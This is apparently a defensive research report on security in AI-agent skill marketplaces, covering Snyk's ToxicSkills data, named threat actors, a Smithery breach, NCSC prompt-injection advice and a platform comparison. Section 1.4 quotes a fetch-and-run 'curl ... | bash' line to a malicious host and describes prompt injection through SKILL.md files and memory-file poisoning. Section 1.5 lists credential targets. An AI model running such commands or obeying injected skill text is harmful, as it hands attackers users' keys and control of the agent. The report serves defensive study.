# Platform Security Postures: AI Agent Skills Ecosystem

**Date**: 2026-02-15
**Researcher**: research-security agent
**Scope**: 6 major platforms + vendor skills + Snyk ToxicSkills data

---

## Executive Summary

The AI agent skills ecosystem is in a **security crisis**. Snyk's ToxicSkills study found that **36.82% of skills have security flaws** and **76 confirmed malicious payloads** exist across major platforms. The UK NCSC has warned that prompt injection — the primary attack vector — may **never be fully mitigated**. Most platforms operate with minimal or no security scanning, creating a supply chain attack surface comparable to the early days of npm before `npm audit`.

---

## 1. Snyk ToxicSkills Study (February 2026)

### 1.1 Key Statistics

| Metric | Value | Source |
|--------|-------|--------|
| Total skills scanned | 3,984 | ClawHub + skills.sh |
| Skills with any security flaw | 36.82% (1,467) | All severity levels |
| Skills with critical issues | 13.4% (534) | Malware, prompt injection, exposed secrets |
| Confirmed malicious payloads | 76 | Human-in-the-loop review |
| Malicious skills still live | 8 | As of publication date |
| Daily submission growth | 50 → 500/day | 10x increase Jan-Feb 2026 |

### 1.2 Detection Rates by Policy

| Security Policy | skills.sh (top 100) | Confirmed Malicious | ClawHub (all) |
|----------------|---------------------|---------------------|---------------|
| Prompt Injection | 0.0% | 91% | 2.6% |
| Malicious Code | 0.0% | 100% | 5.3% |
| Suspicious Download | 0.0% | 100% | 10.9% |
| Credential Handling | 5.0% | 63% | 7.1% |
| Secret Detection | 2.0% | 32% | 10.9% |
| Third-Party Content | 9.0% | 54% | 17.7% |
| Unverifiable Dependencies | 2.0% | 21% | 2.9% |
| Direct Money Access | 2.0% | 10% | 8.7% |

**Critical finding**: 100% of confirmed malicious skills contain malicious code patterns, while 91% simultaneously employ prompt injection techniques — a convergence pattern.

### 1.3 Identified Threat Actors

| Threat Actor | Tactics | Known Skills |
|-------------|---------|--------------|
| **zaycv** | 40+ skills with programmatic naming patterns | `clawhud`, `clawhub1` |
| **Aslaep123** | Crypto/trading-focused social engineering | `polymarket-traiding-bot`, `base-agent`, `bybit-agent` |
| **aztr0nutzs** | Ready-to-deploy malware (NET_NiNjA.v1.2) | Reverse shell payloads |
| **moonshine-100rze** | Credential theft | `moltbook-lm8` |
| **pepe276** | Distribution of trojanized archives | `moltbookagent`, `publish-dist` |

### 1.4 Attack Techniques (From SKILL.md to Shell Access)

Three primary vectors documented by Snyk:

1. **External malware distribution**: Password-protected archives with trojanized installers via "Prerequisites" sections
2. **Obfuscated data exfiltration**: Base64-encoded data sent to attacker-controlled endpoints
3. **Security disablement**: Destructive system modifications and credential harvesting

**The "Three Lines" Attack**: A SKILL.md file with `curl -sSL https://malicious.site/setup.sh | bash` in a code block is interpreted by AI agents as an executable instruction, not documentation.

**Memory Poisoning**: Attackers target `SOUL.md` and `MEMORY.md` files to create persistent behavioral modifications affecting all future agent interactions.

### 1.5 Data Exfiltration Targets (ClawHavoc Campaign)

- `~/.clawdbot/.env` (API keys, tokens)
- Browser credential stores
- Cryptocurrency wallets (MetaMask, Exodus, Coinbase)
- SSH keys and authentication tokens

**Source**: [Snyk ToxicSkills Blog](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) | [SKILL.md to Shell Access](https://snyk.io/articles/skill-md-shell-access/)

---

## 2. Platform-by-Platform Security Postures

### 2.1 Skills.sh (by Vercel)

| Dimension | Status |
|-----------|--------|
| **Launch Date** | January 20, 2026 |
| **Scale** | Top skill: 26K+ installs (growing rapidly) |
| **Security Scanning** | None built-in |
| **Versioning** | None (GitHub HEAD) |
| **Trust/Verification** | None |
| **Review Process** | Open directory — anyone can publish |
| **Known Incidents** | None reported (too new) |
| **Ranking** | Install count only (gameable) |

**Assessment**: Skills.sh is purely a discovery/leaderboard platform. It provides zero security guarantees. The only barrier to publishing is hosting a SKILL.md on GitHub. Install counts serve as the sole quality signal — which can be gamed and does not correlate with safety.

**Quote**: "Skills.sh has no quality control. Anyone can create a skill, host it on GitHub, and tell people to install it."

**Source**: [Vercel Changelog](https://vercel.com/changelog/introducing-skills-the-open-agent-skills-ecosystem) | [Skills.sh](https://skills.sh/)

### 2.2 Smithery

| Dimension | Status |
|-----------|--------|
| **Scale** | 3,243+ hosted MCP servers |
| **Security Scanning** | Minimal (infrastructure-level) |
| **Versioning** | Docker image-based |
| **Trust/Verification** | None |
| **Major Breach** | June 2025 — path traversal + supply chain compromise |
| **Fix Timeline** | 3 days (disclosure → fix) |

**The Breach (June 2025)**:
- **Vector**: Path traversal in `dockerBuildPath` parameter (`.."` → parent directory access)
- **Impact**: Exposed `.docker/config.json` with Fly.io API token controlling 3,243 apps
- **Scope**: Attacker could execute arbitrary code on 3,000+ hosted MCP servers
- **Data at Risk**: Thousands of API keys from client traffic (demonstrated with Brave API keys)
- **Timeline**: Discovered June 10, disclosed June 13, partial fix June 14, full fix June 15
- **Exploitation**: No evidence of wild exploitation before fix

**Source**: [GitGuardian Blog](https://blog.gitguardian.com/breaking-mcp-server-hosting/) | [SC Media](https://www.scworld.com/news/smithery-ai-fixes-path-traversal-flaw-that-exposed-3000-mcp-servers)

### 2.3 SkillsDirectory.com

| Dimension | Status |
|-----------|--------|
| **Scale** | 36,109 skills listed |
| **Security Scanning** | Yes — 50+ rules, 10 threat categories |
| **Versioning** | Unknown |
| **Trust/Verification** | Letter grades (A-F) |
| **Review Process** | All submissions reviewed before publishing |
| **CLI** | `npm install -g openskills` |

**Grade Distribution**:
| Grade | Count | Percentage |
|-------|-------|------------|
| A | 34,092 | 94.4% |
| B | 1,201 | 3.3% |
| C | 576 | 1.6% |
| D | 156 | 0.4% |
| F | 84 | 0.2% |

**Assessment**: Most comprehensive scanning among open platforms. However, 94.4% receiving Grade A raises questions about scanning depth — compared to Snyk's 36.82% flaw rate across the ecosystem, this suggests either curated submissions or less aggressive scanning.

**Source**: [SkillsDirectory.com](https://www.skillsdirectory.com/)

### 2.4 ClawHub / OpenClaw

| Dimension | Status |
|-----------|--------|
| **Scale** | Part of 3,984 skills in Snyk study |
| **Security Scanning** | None |
| **Versioning** | None |
| **Trust/Verification** | None |
| **Publishing Barrier** | SKILL.md file + GitHub account (1 week old) |
| **Known Incidents** | ClawHavoc campaign (30+ malicious skills), ongoing threat actor activity |

**Assessment**: Ground zero for the ToxicSkills problem. No code signing, no security review, no verification. ClawHub is the primary target for supply chain attacks due to its permissionless publishing model and large user base. 5.3% of all ClawHub skills contain malicious code patterns.

**Key stat**: 8 confirmed malicious skills remain publicly available as of Snyk's publication date.

**Source**: [Snyk ClawHub Research](https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/) | [ClawHavoc Campaign](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/)

### 2.5 Fabric Registry (SpecWeave)

| Dimension | Status |
|-----------|--------|
| **Scale** | Internal plugin registry |
| **Security Scanning** | Yes — 26 pattern checks, 6 categories (see audit) |
| **Versioning** | Semver in registry schema |
| **Trust/Verification** | 3 tiers: official / verified / community |
| **Review Process** | Manual (plugin author) |
| **Pre-commit Guards** | 15 hooks including security pattern scanning |

**Assessment**: Strongest built-in scanning among evaluated platforms, but scanner is not integrated into any automated pipeline. The `scanSkillContent()` function exists but is only used in tests. Trust tiers are defined in schema but not enforced through a certification process. See [SpecWeave Security Audit](./specweave-security-audit.md) for detailed analysis.

### 2.6 Vendor Skills (Official)

#### Anthropic (MCP Creator)
- Maintains official reference MCP server implementations
- MCP spec includes security design criteria: trust boundaries, attestation, signature verification, audit logging
- **CVE-2025-68143/4/5**: Three vulnerabilities in Anthropic's own Git MCP server enabling RCE via prompt injection
- Security model emphasizes "only use MCP servers that you trust" — places burden on users

#### OpenAI (Codex Skills)
- Codex scans `.agents/skills` directories
- Skills format documented at developers.openai.com/codex/skills
- No public security scanning or verification system

#### Google
- No public agent skills security framework identified
- Gemini CLI supports Agent Skills format (universal agent)

**Source**: [MCP Specification](https://modelcontextprotocol.io/specification/2025-11-25) | [Anthropic MCP Blog](https://www.anthropic.com/news/model-context-protocol)

---

## 3. UK NCSC Position on Prompt Injection (December 2025)

The UK National Cyber Security Centre published a landmark advisory: **"Prompt injection is not SQL injection (it may be worse)"**.

### Key Arguments

1. **No silver bullet**: Unlike SQL injection (fixable with parameterized queries), LLMs **cannot inherently distinguish instructions from data**
2. **May never be fully mitigated**: "Prompt injection attacks may never be totally mitigated in the way SQL injection attacks can be"
3. **Dangerous analogy**: Comparing to SQL injection creates false confidence that a similar one-shot fix exists
4. **Scale warning**: Without addressing this misconception, organizations risk "data breach victims at a scale unseen since SQL injection attacks were widespread 10 to 15 years ago"
5. **Recommended approach**: Design systems acknowledging LLMs are "inherently confusable" — reduce impact, don't try to eliminate

**Implication for SpecWeave**: Any skill security system must treat prompt injection as a **risk to be managed**, not eliminated. Multi-layered defense (scanning + LLM judge + human review + runtime monitoring) is the only viable approach.

**Source**: [NCSC Blog](https://www.ncsc.gov.uk/blog-post/prompt-injection-is-not-sql-injection) | [Malwarebytes Coverage](https://www.malwarebytes.com/blog/news/2025/12/prompt-injection-is-a-problem-that-may-never-be-fixed-warns-ncsc)

---

## 4. Broader Ecosystem Security Data

### 4.1 MCP Server Ecosystem

| Metric | Value | Source |
|--------|-------|--------|
| MCP servers launched on GitHub (2025) | 13,000+ | Industry reports |
| MCP servers requiring credentials | 88% | Astrix Security |
| Using insecure static secrets | 53% | Astrix Security |
| CVE-2025-6514 (mcp-remote OAuth) | 437,000+ dev environments compromised | Security advisories |

### 4.2 Credential Leaks

Snyk's separate research found **280+ leaky skills** on OpenClaw and ClawHub actively exposing API keys and PII.

**Source**: [Snyk Credential Leaks](https://snyk.io/blog/openclaw-skills-credential-leaks-research/) | [Astrix State of MCP Security](https://astrix.security/learn/blog/state-of-mcp-server-security-2025/)

---

## 5. Comparative Security Posture Matrix

| Platform | Scanning | Versioning | Trust Tiers | Review Process | Breach History | Overall |
|----------|----------|------------|-------------|----------------|----------------|---------|
| **Skills.sh** | None | None | None | None | None (new) | Very Low |
| **Smithery** | Minimal | Docker | None | None | June 2025 breach | Low |
| **SkillsDirectory** | 50+ rules | Unknown | A-F grades | Pre-publish review | None known | Medium |
| **ClawHub** | None | None | None | None | Active malware | Very Low |
| **Fabric (SpecWeave)** | 26 patterns | Semver | 3 tiers | Manual | None | Medium |
| **Anthropic MCP** | Spec-level | Spec-level | Trust boundaries | N/A (reference) | CVE-2025-68143/4/5 | Medium |

---

## 6. Risk Taxonomy

### 6.1 Supply Chain Attack Vectors

```
SKILL.md Publication → No Scanning → User Installation → Agent Execution
     ↓                                                        ↓
Malicious code blocks                              Shell access, data exfiltration
Prompt injection                                   Behavioral hijacking
Credential harvesting                              Memory poisoning
Trojanized prerequisites                           Persistent backdoors
```

### 6.2 Threat Categories

| Category | Prevalence | Severity | Mitigation Feasibility |
|----------|-----------|----------|----------------------|
| Malicious Code | 5.3% of ClawHub | Critical | High (static analysis) |
| Prompt Injection | 2.6% of ClawHub, 91% of malicious | Critical | Low (NCSC: may be unfixable) |
| Credential Exposure | 10.9% of ClawHub | High | Medium (secret scanning) |
| Data Exfiltration | 10.9% (suspicious downloads) | High | Medium (network analysis) |
| Memory Poisoning | Unknown | High | Low (behavioral analysis) |
| Dependency Attacks | 2.9% of ClawHub | Medium | Medium (dependency scanning) |

---

## 7. Implications for SpecWeave / verified-skill.com

1. **Market opportunity is enormous**: No platform currently provides comprehensive, multi-tier verification. SkillsDirectory.com is closest but its 94.4% Grade-A rate suggests shallow scanning.

2. **Three-tier certification is validated**: The convergence of regex scanning + LLM judge + human review aligns with industry needs. No existing platform does all three.

3. **Prompt injection requires pragmatism**: Following NCSC guidance, SpecWeave should **flag and label** prompt injection risks rather than claiming to eliminate them.

4. **Continuous monitoring is essential**: 8 malicious skills remaining live on ClawHub shows that publish-once-scan-once is insufficient. Ongoing re-scanning with badge downgrades is needed.

5. **Version-pinned verification is a differentiator**: No platform currently ties security scanning to specific versions with content hashing and diff scanning.

6. **Speed matters**: Daily submissions grew 10x in one month. Any verification pipeline must handle 500+ submissions/day at launch scale.
